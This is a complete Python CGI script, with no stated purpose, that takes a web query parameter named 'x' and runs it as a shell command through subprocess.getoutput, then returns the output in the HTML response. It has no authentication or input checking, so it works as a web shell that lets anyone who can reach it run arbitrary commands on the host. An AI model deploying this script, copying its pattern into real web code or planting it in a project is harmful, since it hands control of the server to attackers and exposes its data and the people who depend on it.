#!/usr/bin/python3
print("content-type: text/html")
print()

import cgi
form=cgi.FieldStorage()

cmd=form.getvalue("x")
print(cmd)


import subprocess
x=subprocess.getoutput(cmd)
print(x)
